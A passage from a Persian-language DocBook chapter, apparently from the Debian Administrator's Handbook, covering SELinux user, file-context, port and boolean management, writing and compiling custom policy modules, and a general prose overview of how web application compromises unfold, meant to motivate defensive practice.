	<para><command>semanage user -l</command> نگاشت فعلی بین شناسه‌های کاربری SELinux و نقش‌های مجاز را فهرست می‌کند. افزودن یک شناسه جدید مستلزم تعریف نقش‌های مرتبط با آن همراه با پیشوند برچسب‌گذاری برای اختصاص نوع به فایل‌های شخصی کاربر می‌باشد (<filename>/home/<replaceable>user</replaceable>/*</filename>). پیشوند باید از میان <literal>user</literal>، <literal>staff</literal> یا <literal>sysadm</literal> انتخاب شود. پیشوند “<literal>staff</literal>” روی فایل‌هایی از نوع “<literal>staff_home_dir_t</literal>” تاثیر می‌گذارد. ایجاد یک شناسه کاربری جدید SELinux توسط <command>semanage user -a -R <replaceable>roles</replaceable> -P <replaceable>prefix</replaceable> <replaceable>identity</replaceable></command> انجام می‌شود. در نهایت، با استفاده از <command>semanage user -d <replaceable>identity</replaceable></command> می‌توانید یک شناسه کاربری SELinux را حذف کنید.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
<computeroutput>
                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles

root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
system_u        user       SystemLow  SystemLow-SystemHigh  system_r
test_u          staff      SystemLow  SystemLow             staff_r user_r
unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
user_u          user       SystemLow  SystemLow             user_r
# </computeroutput><userinput>semanage user -d test_u</userinput></screen>
      </section>
      <section>
        <title>مدیریت زمینه‌های فایل، درگاه‌ها و شرایط منطقی</title>

	<para>هر ماژول SELinux مجموعه‌ای از قوانین برچسب‌گذاری را تعریف می‌کند، اما امکان تعریف قوانین سفارشی برای برچسب‌گذاری نیز وجود دارد. برای نمونه، اگر می‌خواهید که سرور وب قادر باشد فایل‌های درون دایرکتوری <filename>/srv/www/</filename> را بخواند، می‌توانید دستور <command>semanage fcontext -a -t httpd_sys_content_t "/srv/www(/.*)?"</command> را همراه با <command>restorecon -R /srv/www/</command> اجرا کنید. دستور اول قوانین جدید برچسب‌گذاری را ثبت و دستور دوم انواع فایل را متناسب با قوانین جدید برچسب‌گذاری می‌کند.</para>

	<para>به طور مشابه، درگاه‌های TCP/UDP به شیوه‌ای برچسب‌گذاری می‌شوند که تنها فرآیندهای پس‌زمینه متناسب بتوانند به آن‌ها گوش دهند. برای نمونه، اگر می‌خواهید سرور وب به درگاه ۸۰۸۰ گوش دهد، باید <command>semanage port -m -t http_port_t -p tcp 8080</command> را اجرا کنید.</para>

	<para>برخی ماژول‌های SELinux گزینه‌های منطقی‌ای را استخراج می‌کنند که با استفاده از آن‌ها می‌توانید عملکرد قوانین پیشفرض را تغییر دهید. از ابزار <command>getsebool</command> می‌توان برای شناسایی این گزینه‌ها استفاده کرد (<command>getsebool <replaceable>boolean</replaceable></command> یک گزینه و <command>getsebool -a</command> تمام گزینه‌ها را نمایش می‌دهد). دستور <command>setsebool <replaceable>boolean</replaceable> <replaceable>value</replaceable></command> مقدار فعلی یک گزینه منطقی را تغییر می‌دهد. گزینه <literal>-P</literal> باعث می‌شود که این تغییرات به صورت ثابت باقیمانده و در راه‌اندازی‌های بعدی سیستم دچار تغییر نشوند. مثال زیر به یک سرور وب اجازه می‌دهد که با دایرکتوری‌های home دسترسی یابد (در صورتی مفید است که وبسایت کاربران در <filename>~/public_html/</filename> قرار داشته باشد).</para>

        <screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
<computeroutput>httpd_enable_homedirs --&gt; off
# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput></screen>
      </section>
    </section>
    <section id="sect.selinux-custom-rules">
      <title>انطباق قوانین</title>

      <para>از آنجا که خط مشی SELinux ماژولار بوده، توسعه ماژول‌های جدید برای برنامه‌هایی که به آن نیاز دارند (به صورت سفارشی) کار جالبی است. این ماژول‌های جدید <emphasis>خط مشی مرجع</emphasis> را کامل می‌کنند.</para>

      <para>برای ایجاد ماژول‌های جدید، بسته‌های <emphasis role="pkg">selinux-policy-dev</emphasis> و <emphasis role="pkg">selinux-policy-doc</emphasis> مورد نیاز هستند. بسته دوم شامل مستندات قوانین استاندارد (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) و فایل‌های نمونه است که می‌توانند به عنوان قالب برای ایجاد ماژول‌های جدید بکار روند. این فایل‌ها را نصب کرده و به دقت مطالعه نمایید:</para>

      <screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput></screen>

      <para>فایل <filename>.te</filename> مهم‌ترین آن‌ها است که قوانین را تعریف می‌کند. فایل <filename>.fc</filename> “زمینه‌های فایل” را تعریف می‌کند، که همان نوع اختصاص یافته به فایل‌های مرتبط با این ماژول است. از داده موجود درون فایل <filename>.fc</filename> در گام برچسب‌گذاری استفاده می‌شود. در نهایت، فایل <filename>.if</filename> رابط مرتبط با ماژول را تعریف می‌کند: یک مجموعه از “توابع عمومی” است که سایر ماژول‌ها می‌توانند به منظور تعامل بهتر با این ماژول از آن‌ها استفاده کنند.</para>
      <section>
        <title>نوشتن یک فایل <filename>.fc</filename></title>

	<para>خواندن مثال زیر برای درک اولیه از محتوای فایل مذکور کافی است. می‌توانید با استفاده از عبارت‌های منظم یک زمینه امنیتی یکسان را برای چندین فایل یا حتی یک دایرکتوری کامل در نظر بگیرید.</para>

        <example>
          <title>فایل <filename>example.fc</filename></title>

          <programlisting role="scale"># myapp executable will have:
# label: system_u:object_r:myapp_exec_t
# MLS sensitivity: s0
# MCS categories: &lt;none&gt;

/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)</programlisting>
        </example>
      </section>
      <section>
        <title>نوشتن یک فایل <filename>.if</filename></title>

	<para>در مثال زیر، اولین رابط (“<literal>myapp_domtrans</literal>”) کنترل می‌کند چه کسی می‌تواند برنامه را اجرا کند. رابط دوم (“<literal>myapp_read_log</literal>”) اجازه خواندن و نوشتن روی فایل‌های گزارش برنامه را می‌دهد.</para>

	<para>هر رابط باید مجموعه‌ای معتبر از قوانین را که درون فایل <filename>.te</filename> قرار می‌گیرند تعریف کند. بنابراین باید تمام انواع مورد استفاده خود را تعریف کنید (با استفاده از ماکرو <literal>gen_require</literal>) و از عبارت‌های استاندارد به منظور تخصیص دسترسی بهره ببرید. با این حال، به یاد داشته باشید که می‌توانید از رابط‌های سایر ماژول‌ها نیز استفاده کنید. قسمت بعد توضیحات بیشتری در مورد چگونگی تخصیص این دسترسی‌ها ارائه می‌دهد.</para>

        <example>
          <title>فایل <filename>example.if</filename></title>

          <programlisting>## &lt;summary&gt;Myapp example policy&lt;/summary&gt;
## &lt;desc&gt;
##      &lt;p&gt;
##              More descriptive text about myapp.  The &lt;desc&gt;
##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;
##              html tags for formatting.
##      &lt;/p&gt;
##      &lt;p&gt;
##              This policy supports the following myapp features:
##              &lt;ul&gt;
##              &lt;li&gt;Feature A&lt;/li&gt;
##              &lt;li&gt;Feature B&lt;/li&gt;
##              &lt;li&gt;Feature C&lt;/li&gt;
##              &lt;/ul&gt;
##      &lt;/p&gt;
## &lt;/desc&gt;
#

########################################
## &lt;summary&gt;
##      Execute a domain transition to run myapp.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to transition.
## &lt;/param&gt;
#
interface(`myapp_domtrans',`
        gen_require(`
                type myapp_t, myapp_exec_t;
        ')

        domtrans_pattern($1,myapp_exec_t,myapp_t)
')

########################################
## &lt;summary&gt;
##      Read myapp log files.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to read the log files.
## &lt;/param&gt;
#
interface(`myapp_read_log',`
        gen_require(`
                type myapp_log_t;
        ')

        logging_search_logs($1)
        allow $1 myapp_log_t:file r_file_perms;
')</programlisting>
        </example>

        <sidebar>
          <title><emphasis>مستندات</emphasis> توضیحات درباره <emphasis>خط مشی مرجع</emphasis></title>

	  <para><emphasis>reference policy</emphasis> مانند هر پروژه نرم‌افزار آزاد دیگری رشد می‌کند: مبتنی بر مشارکت داوطلبانه. پروژه توسط Tresys، یکی از فعال‌ترین شرکت‌های حوزه SELinux، میزبانی می‌شود. ویکی آن‌ها شامل توضیحاتی درباره چگونگی ساختار قوانین و چگونگی ایجاد قوانین جدید است. <ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" /></para>
        </sidebar>
      </section>
      <section id="sect.writing-a-te-file">
        <title>نوشتن یک فایل <filename>.te</filename></title>

	<para>نگاهی به فایل <filename>example.te</filename> بیندازید:</para>

        <sidebar>
          <title><emphasis>مطالعه بیشتر</emphasis> زبان ماکرو <command>m4</command></title>

	  <para>برای ساختاردهی مناسب خط مشی، توسعه‌دهندگان SELinux از یک پردازشگر دستور-ماکرو استفاده کرده‌اند. بجای رونوشت‌گیری از عبارت‌های مشابه <emphasis>allow</emphasis>، آن‌ها “توابع ماکرو” را ایجاد کرده‌اند که از یک منطق سطح بالاتر استفاده می‌کند، که این عمل به خوانایی بیشتر خط مشی می‌انجامد.</para>

	  <para>در عمل، از <command>m4</command> برای کامپایل کردن این قوانین استفاده می‌شود. این ابزار عملیات را به صورت برعکس انجام می‌دهد: یعنی با بازکردن تمام آن عبارت‌های سطح-بالا به صورت یک پایگاه‌داده بزرگ از عبارت‌های <emphasis>allow</emphasis> عمل می‌کند.</para>

	  <para>“رابط‌های” موجود در SELinux فقط توابع ماکرو هستند که در زمان کامپایل با یک سری از قوانین جایگزین می‌گردند. به صورت مشابه، برخی دسترسی‌ها در حقیقت مجموعه‌ای از دسترسی‌ها هستند که در زمان کامپایل با مقادیر خود جایگزین می‌شوند.</para>
        </sidebar>

        <programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>

########################################
#
# Declarations
#

type myapp_t; <co id="example.te.type"></co>
type myapp_exec_t;
domain_type(myapp_t)
domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"></co>

type myapp_log_t;
logging_log_file(myapp_log_t) <co id="example.te.interface"></co>

type myapp_tmp_t;
files_tmp_file(myapp_tmp_t)

########################################
#
# Myapp local policy
#

allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>

allow myapp_t myapp_tmp_t:file manage_file_perms;
files_tmp_filetrans(myapp_t,myapp_tmp_t,file)</programlisting>
        <calloutlist>
          <callout arearefs="example.te.module">
	    <para>ماژول باید توسط نام و شماره نسخه‌اش معرفی شود. این عبارت مورد نیاز است.</para>
          </callout>
          <callout arearefs="example.te.type">
	    <para>اگر ماژول انواع جدیدی را معرفی کند، باید به شکل عبارت مشابه بالا باشد. از ایجاد انواع مورد نیاز خود دریغ نکنید بجای اینکه تعداد زیادی دسترسی بی‌معنا صادر کنید.</para>
          </callout>
          <callout arearefs="example.te.domain">
	    <para>این رابط‌ها نوع <literal>myapp_t</literal> را به عنوان یک دامنه فرآیند تعریف می‌کنند که باید برای هر برنامه اجرایی برچسب‌گذاری شده با <literal>myapp_exec_t</literal> بکار روند. به طور ضمنی، اینکار یک صفت <literal>exec_type</literal> روی آن اشیا اضافه می‌کند، که در عوض به سایر ماژول‌ها اجازه می‌دهد برای اجرای برنامه‌ها دسترسی‌های لازم را صادر کنند: برای نمونه، ماژول <literal>userdomain</literal> به فرآیندهای موجود در دامنه‌های <literal>user_t</literal>، <literal>staff_t</literal> و <literal>sysadm_t</literal> اجازه اجرا می‌دهد. دامنه‌های سایر برنامه‌های محدود شده اجازه دسترسی برای اجرا را ندارند، مگر اینکه قوانین همان دسترسی‌ها را برایشان تعریف کنند (برای نمونه، در مورد <command>dpkg</command> همراه با دامنه <literal>dpkg_t</literal> آن).</para>
          </callout>
          <callout arearefs="example.te.interface">
	    <para><literal>logging_log_file</literal> رابطی است که توسط خط مشی مرجع فراهم شده است. مشخص می‌کند فایل‌هایی که با این نوع برچسب‌گذاری شده‌اند از نوع گزارش بوده و باید از مزیت قوانین اختصاصی آن بهره‌مند شوند (برای مثال دسترسی دادن به <command>logrotate</command> تا بتواند گزارش‌ها را تغییر دهد).</para>
          </callout>
          <callout arearefs="example.te.allow">
	    <para><literal>allow</literal> عبارت پایه‌ای است که برای احرازهویت یک عملیات استفاده می‌شود. پارامتر اول آن دامنه فرآیندی است که امکان اجرای عملیات را دارد. پارامتر دوم به تعریف یک شی می‌پردازد که فرآیند دامنه قبلی می‌تواند آن را تغییر دهد. این پارامتر به شکل “<replaceable>type</replaceable>:<replaceable>class</replaceable>“ است که در آن <replaceable>type</replaceable> نوع SELinux است و <replaceable>class</replaceable> طبیعت آن شی را تعریف می‌کند (فایل، دایرکتوری، سوکت و از این قبیل). در نهایت، پارامتر آخر به تعریف مجوزها می‌پردازد (همان عملیات مجاز).</para>

	    <para>مجوزها مجموعه‌ای از عملیات مجاز هستند که از قالب رو‌به‌رو تبعیت می‌کنند: <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal>. اگرچه، می‌توانید از ماکروها برای نمایش کاربردی‌ترین مجوزها نیز استفاده کنید. فایل <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename> فهرستی از آن‌ها را شامل می‌شود.</para>

	    <para>صفحه وب پیش‌رو فهرستی طولانی از کلاس‌های اشیا و مجوزهای مربوط به هر کدام را نمایش می‌دهد. <ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" /></para>
          </callout>
        </calloutlist>

	<para>اکنون باید حداقل مجموعه قوانین مورد نیاز برای اجرای صحیح برنامه یا سرویس هدف را پیدا کنید. برای دستیابی به این منظور، باید دانش خوبی از چگونگی کارکرد برنامه و انواع داده‌های مدیریتی/تولیدی آن را داشته باشید.</para>

	<para>اگرچه، رویکرد تجربی نیز ممکن است. زمانی که اشیای مربوطه برچسب‌گذاری شده‌اند، می‌توانید از برنامه در حالت permissive استفاده کنید: عملیاتی که ممنوع باشند ثبت گزارش شده ولی هنوز اجرا می‌شوند. با بررسی و تحلیل این گزارش‌ها می‌توانید عملیات مجاز را تشخیص دهید. در اینجا نمونه‌ای از چنین فایل گزارشی آورده شده است:</para>

        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1</programlisting>

	<para>برای درک بهتر این پیام بیایید آن را قطعه به قطعه مطالعه کنیم.</para>

        <table colsep="1">
          <title>بررسی و تحلیل گزارش SELinux</title>
          <tgroup cols="2">
            <thead>
              <row>
                <entry>پیام</entry>
                <entry>توضیحات</entry>
              </row>
            </thead>
            <tbody>
              <row>
                <entry><computeroutput>avc: denied</computeroutput></entry>
                <entry>عملیات غیرمجاز است.</entry>
              </row>
              <row>
                <entry><computeroutput>{ read write }</computeroutput></entry>
                <entry>این عملیات نیازمند مجوزهای <literal>read</literal> و <literal>write</literal> است.</entry>
              </row>
              <row>
                <entry><computeroutput>pid=1876</computeroutput></entry>
                <entry>فرآیندی با شناسه ۱۸۷۶ اقدام به اجرای عملیات کرده است.</entry>
              </row>
              <row>
                <entry><computeroutput>comm="syslogd"</computeroutput></entry>
                <entry>فرآیند یک نمونه از برنامه <literal>syslogd</literal> بوده است.</entry>
              </row>
              <row>
                <entry><computeroutput>name="xconsole"</computeroutput></entry>
                <entry>شی هدف <literal>xconsole</literal> نام دارد. بعضی وقت‌ها می‌توانید یک متغیر “path” داشته باشید - همراه با مسیر کامل-.</entry>
              </row>
              <row>
                <entry><computeroutput>dev=tmpfs</computeroutput></entry>
                <entry>دستگاهی که از شی هدف میزبانی می‌کند یک <literal>tmpfs</literal> است (یک فایل سیستم داخل-حافظه‌ای). برای یک دیسک حقیقی، می‌توانید شماره پارتیشن آن را مشاهده کنید (برای مثال: “sda3”).</entry>
              </row>
              <row>
                <entry><computeroutput>ino=5510</computeroutput></entry>
                <entry>شی با inode ۵۵۱۰ شناسایی شده است.</entry>
              </row>
              <row>
                <entry><computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput></entry>
                <entry>این همان زمینه امنیتی فرآیندی است که عملیات را اجرا کرده است.</entry>
              </row>
              <row>
                <entry><computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput></entry>
                <entry>این همان زمینه امنیتی شی هدف می‌باشد.</entry>
              </row>
              <row>
                <entry><computeroutput>tclass=fifo_file</computeroutput></entry>
                <entry>شی هدف یک فایل FIFO است.</entry>
              </row>
            </tbody>
          </tgroup>
        </table>

	<para>با مشاهده این گزارش، امکان ایجاد یک قانون برای مجاز ساختن این عملیات وجود دارد. برای مثال: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. این فرآیند می‌تواند خودکارسازی شده و دقیقا همان کاری است که دستور <command>audit2allow</command> (از بسته <emphasis role="pkg">policycoreutils</emphasis>) پیشنهاد می‌کند. این رویکرد تنها زمانی موثر است که اشیای گوناگون به شیوه‌ای درست و متناسب با آنچه محدود شده است برچسب‌گذاری شده باشند. در هر صورت، باید به دقت قوانین تولید شده را متناسب با دانش خود از چگونگی کارکرد برنامه بررسی و تحلیل کنید. البته، این رویکرد تمایل دارد تا دسترسی‌های بیشتری را نسبت به آنچه مورد نیاز است صادر کند. راهکار صحیح اغلب ایجاد انواع جدیدی است که دسترسی‌ها می‌توانند به آن‌ها اختصاص یابند. همچنین پیش می‌آید که یک عملیات غیرمجاز برای برنامه مرگبار نباشد، که در این صورت بهتر است به صورت یک قانون “<literal>dontaudit</literal>” برای پیشگیری از ثبت در فایل گزارش افزوده شود.</para>

        <sidebar>
          <title><emphasis>تکمیلی</emphasis> عدم وجود نقش‌ها در قوانین خط مشی</title>
          <indexterm><primary>Type Enforcement</primary></indexterm>
          <indexterm><primary>Enforcement, Type Enforcement</primary></indexterm>

	  <para>ممکن است عجیب بنظر آید که در زمان ایجاد قوانین، هیچ نقشی در آن‌ها وجود ندارد. SELinux تنها از دامنه‌ها به منظور یافتن عملیات مجاز استفاده می‌کند. نقش تنها به صورت غیرمستقیم در تعویض کاربر به یک دامنه دیگر دخالت دارد. SELinux مبتنی بر نظریه‌ای بنام <emphasis>Type Enforcement</emphasis> است که نوع تنها عنصری است که برای صدور دسترسی‌ها استفاده می‌شود.</para>
        </sidebar>
      </section>
      <section>
        <title>کامپایل‌کردن فایل‌ها</title>

	<para>زمانی که سه فایل <filename>example.if</filename>، <filename>example.fc</filename> و <filename>example.te</filename> با انتظارات شما از قوانین جدید سازگار شوند، تنها کافی است دستور <command>make NAME=devel</command> را برای تولید یک ماژول در فایل <filename>example.pp</filename> استفاده کنید (که بلافاصله می‌توانید با دستور <command>semodule -i example.pp</command> آن را فعال‌سازی کنید). اگر چندین ماژول تعریف شده باشند، <command>make</command> تمام فایل‌های <filename>.pp</filename> متناسب با آن‌ها را می‌سازد.</para>
      </section>
    </section>
  </section>
  <section id="sect.other-security-considerations">
    <title>سایر ملاحظات مرتبط با امنیت</title>

    <para>امنیت تنها یک مشکل فنی نیست؛ بیش از هر چیر، درباره رویکردهای خوب و درک از خطر است. این قسمت به بررسی برخی از خطرات متداول، همراه با برخی رویکردهای خوب، که بر اساس موضوع مورد مطالعه، امنیت را افزایش داده یا احتمال بروز حمله احتمالی را کاهش می‌دهند.</para>
    <section>
      <title>خطرات ذاتی در برنامه‌های تحت وب</title>

      <para>ویژگی اصلی برنامه‌های تحت وب منجر به تکثیر آن‌ها می‌شود. برخی از آن‌ها اغلب به صورت موازی اجرا می‌شوند: ایمیل تحت وب، ویکی، برخی نرم‌افزارهای گروهی، انجمن‌ها، نگارخانه‌ای از تصاویر، وبلاگ و از این قبیل. بسیاری از این برنامه‌ها مبتنی بر پشته “LAMP” یا <emphasis>Linux, Apache, MySQL, PHP</emphasis> هستند. متاسفانه، بسیاری از این برنامه‌ها بدون در نظر گرفتن اصول امنیتی نوشته شده‌اند. داده‌ای که از خارج برنامه وارد می‌شود، اغلب بدون کوچکترین بررسی ذخیره‌سازی می‌گردد. فراهم کردن مقادیر ویژه می‌تواند به منظور خراب کردن برخی دستورات قابل اجرا بکار رود. بسیاری از مشکلات مشخص در گذر زمان برطرف شده‌اند، اما مشکلات جدید امنیتی به صورت روزانه بوجود می‌آیند.</para>

      <sidebar>
        <title><emphasis>واژگان</emphasis> SQL injection</title>

	<para>زمانی که یک برنامه داده‌های خود را به شیوه‌ای ناامن درون پرس و جوهای SQL وارد می‌کند، مقابل حملات SQL Injection آسیب‌پذیر می‌شود؛ این نام فعالیتی را شامل می‌شود که در آن یک پارامتر به شیوه‌ای خلاف با آنچه در برنامه اصلی در نظر گرفته شده است، اجرا می‌گردد. خواه به منظور آسیب به پایگاه‌داده یا دسترسی به داده‌هایی که نباید قابل دسترس باشند. <ulink type="block" url="http://en.wikipedia.org/wiki/SQL_Injection" /></para>
        <indexterm><primary>SQL injection</primary></indexterm>
      </sidebar>

      <para>از این رو بروزرسانی برنامه‌های تحت وب یک ضرورت به حساب می‌آید، تا مبادا یک خرابکار (خواه یک مهاجم حرفه‌ای یا یک script kiddy) بتواند از آسیب‌پذیری‌های موجود سواستفاده کند. خطر واقعی مبتنی بر این مورد است و طیف گسترده‌ای از تخریب داده تا اجرای کد مخرب را شامل می‌شود، از جمله خارج کردن وبسایت از دسترس.</para>
    </section>
    <section>
      <title>انتظار چه چیزی را داشته باشیم</title>

      <para>یک آسیب‌پذیری در برنامه تحت وب اغلب به عنوان نقطه آغازی برای تلاش‌های خرابکارانه استفاده می‌شود. آنچه در ادامه می‌آید خلاصه‌ای از عواقب احتمالی آن است.</para>

      <sidebar>
        <title><emphasis>نگاه سریع</emphasis> فیلترکردن پرس و جوهای HTTP</title>

	<para>آپاچی ۲ شامل ماژول‌هایی است که امکان فیلترکردن پرس و جوهای دریافتی HTTP را فراهم می‌کند. اینکار از برخی حملات پیشگیری می‌کند. برای نمونه، محدود کردن طول پارامترها می‌توان از buffer overflow پیشگیری کند. به صورت عمومی‌تر، می‌توان قبل از اینکه پارامترها به برنامه ارسال شوند آن‌ها را بررسی و محدود کرد. اینکار حتی می‌تواند با بروزرسانی‌های پویای فایروال ترکیب شود، تا اگر برنامه‌ای قصد سواستفاده از منابع سرور وب را داشت برای بازه مشخصی از دسترسی به آن محروم گردد.</para>

	<para>انجام این بررسی‌ها می‌تواند کار زمان‌بر و خسته کننده‌ای باشد، اما می‌تواند در زمان توسعه برنامه تحت وب در صورتی که امنیت مد نظر قرار گیرد بکار رود.</para>

	<para><emphasis>mod-security2</emphasis> (در بسته <emphasis role="pkg">libapache2-mod-security2</emphasis>) نمونه اصلی چنین ماژولی است. حتی شامل برخی قواعد از پیش موجود خود می‌باشد (در بسته <emphasis role="pkg">modsecurity-crs</emphasis>) که براحتی می‌توانید فعال‌سازی کنید.</para>
        <indexterm><primary><emphasis role="pkg">libapache-mod-security</emphasis></primary></indexterm>
        <indexterm><primary><emphasis>mod-security</emphasis></primary></indexterm>
      </sidebar>

      <para>عواقب یک نفوذ سطوح مختلفی از مشاهدات درباره انگیزه مهاجم اصلی را شامل می‌شود. <emphasis>Script-kiddie</emphasis> تنها از دستورالعمل‌های موجود در وبسایت‌ها استفاده می‌کند؛ اغلب یا وبسایت را از دسترس خارج یا داده‌ها را تخریب می‌کنند. در موارد نامحسوس دیگر، آن‌ها اقدام به افزودن محتوای نامرئی در صفحات وب می‌کنند تا از طریق موتورهای جستجو بازدید بیشتری از سایت خود دریافت کنند.</para>

      <para>یک مهاجم حرفه‌ای تر فراتر از این می‌رود. یک سناریو بحران می‌تواند در چنین موردی بکار رود: مهاجم توانایی اجرای دستورات به عنوان کاربر <literal>www-data</literal> را بدست می‌آورد، اما اجرای یک دستور نیازمند بسیاری تغییرات دیگر است. برای اینکه کار خود را راحت کنند، اقدام به نصب برنامه‌‌های تحت وب دیگری می‌نمایند تا چنین دستوراتی را از راه‌دور اجرا کنند، از جمله مرور فایل سیستم، بررسی مجوزها، آپلود یا دانلود فایل‌ها، اجرای دستورات و حتی فراهم آوردن یک پوسته در شبکه. اغلب، آسیب‌پذیری امکان اجرای دستور <command>wget</command> را برای دانلود برخی بدافزارها درون مسیر <filename>/tmp/</filename> فراهم می‌کند که پس از آن اجرا می‌شوند. بدافزار اغلب از یک وبسایت خارجی دانلود شده که قبل از این مورد نفوذ قرار گرفته است، به این منظور که رد پای مهاجم را پوشانده و یافتن نقطه شروع حمله را دشوار سازد.</para>

      <para>در این نقطه، مهاجم به اندازه‌ای آزادی دارد که می‌تواند یک <emphasis>bot</emphasis> از نوع IRC را نصب کند (یک ربات که به یک سرور IRC متصل شده و از طریق آن کنترل می‌شود). از این ربات اغلب برای اشتراک‌گذاری فایل‌های غیرقانونی استفاده می‌شد (نسخه‌های غیرمجاز از فیلم، نرم‌افزار و از این قبیل). یک مهاجم قاطع شاید بخواهد بیشتر از این پیشروی کند. حساب کاربری <literal>www-data</literal> امکان دسترسی کامل را به کل ماشین فراهم نمی‌کند، از این رو مهاجم تلاش می‌کند دسترسی سطح بالاتری را در اختیار بگیرد. اکنون، اینکار نباید ممکن باشد، اما اگر برنامه تحت وب بروز نباشد، احتمال اینکه کرنل و سایر برنامه‌ها نیز قدیمی باشند وجود دارد؛ اینکار اغلب از تصمیم مدیر سیستم می‌آید، که با وجود آگاهی از آسیب‌پذیری، از بروزرسانی سیستم خودداری می‌کنند با این بهانه که هیچ کاربر محلی برای آن وجود ندارد. از این رو مهاجم با توجه به این آسیب‌پذیری دوم می‌تواند دسترسی کامل به سیستم را اخذ نماید.</para>

      <sidebar>
        <title><emphasis>واژگان</emphasis> Privilege Escalation</title>

	<para>این عبارت شامل مواردی است که از طریق آن می‌توان مجوزهای بیشتر از آنچه مورد نیاز است را بدست آورد. برنامه <command>sudo</command> طوری طراحی شده است که برخی دسترسی‌های مدیریتی به صورت موقت به کاربران داده شود. اما از این عبارت برای تلاش یک نفوذگر در سواستفاده از یک آسیب‌پذیری برای دسترسی بیشتر به مجوزها استفاده می‌شود.</para>
      </sidebar>

      <para>اکنون مهاجم کنترل ماشین را در دست گرفته است؛ آن‌ها معمولا تلاش می‌کنند تا این دسترسی را تا آنجا که ممکن است حفظ نمایند. اینکار شامل نصب یک <emphasis>rootkit</emphasis> می‌شود، برنامه‌ای که با جایگزین کردن برخی اجزای سیستم امکان اتصال مجدد مهاجم به آن را در زمان دیگری فراهم می‌نماید؛ rootkit همچنین تلاش می‌کند رد خود را پوشانده و اثری از خود بر جای نگذارد. یک برنامه <command>ps</command> دستکاری شده از نمایش برخی فرآیندها چشم‌پوشی، <command>netstat</command> برخی ارتباطات فعال را فهرست نمی‌کند و از این قبیل. با استفاده از مجوزهای root، مهاجم می‌توانست دید کلی نسبت به سیستم داشته باشد، اما نمی‌توانست داده‌های مهم را پیدا کند؛ بنابراین تلاش می‌کنند تا به سایر ماشین‌های شبکه داخلی دسترسی یابند. با بررسی و تحلیل حساب کاربری مدیریت و فایل‌های تاریخچه آن، مهاجم در می‌یابد که به کدام ماشین‌ها دسترسی داده شده است. با جایگزین کردن <command>sudo</command> و <command>ssh</command> با برنامه‌های دستکاری شده، مهاجم می‌تواند برخی از گذرواژه‌های مدیر سیستم را رهگیری کند که آن‌ها در سرورهای شناسایی شده استفاده می‌کنند... و عملیات نفوذ می‌تواند از این نقطه رواج یابد.</para>

      <para>این یک سناریوی کابوس‌بار است که می‌تواند با برخی اقدامات پیشگیری شود. قسمت‌های بعدی برخی از این اقدامات را توضیح می‌دهند.</para>
    </section>
    <section id="sect.choosing-the-software-wisely">
      <title>انتخاب آگاهانه نرم‌افزار</title>

      <para>زمانی که مشکلات امنیتی احتمالی شناسایی شدند، در هر گام از این فرآیند توسعه سرویس باید مد نظر قرار گرفته شوند، به خصوص در زمان نصب نرم‌افزار مورد نیاز. بسیاری وبسایت‌ها از جمله <literal>SecurityFocus.com</literal>، فهرستی از آسیب‌پذیری‌های اخیر را نگهداری کرده که می‌تواند قبل از استفاده هر نرم‌افزار دیگری مورد بررسی و تحلیل قرار گیرند. البته، این اطلاعات باید در مقایسه با نرم‌افزار پیش گفته مقایسه شوند: یک برنامه پرکاربردتر به عنوان یک هدف وسوسه برانگیز به حساب می‌آید و عواقب بیشتری نیز با خود در پی دارد. از طرف دیگر، یک برنامه ممکن است شامل حفره‌های امنیتی باشد که هیچگاه به صورت عمومی بنا به دلایل مختلف در یک بازرسی امنیتی مطرح نشده‌اند.</para>

      <sidebar>
        <title><emphasis>واژگان</emphasis> بازرسی امنیتی</title>

	<para>یک بازرسی امنیتی فرآیندی است که در آن به دقت سورس کد یک برنامه به منظور آسیب‌پذیری‌های امنیتی مورد بررسی و تحلیل قرار می‌گیرد. چنین بازرسی‌هایی معمولا به صورت فعال و به منظور اطمینان حاصل کردن از پیشنیازهای امنیتی یک برنامه انجام می‌شوند.</para>
      </sidebar>

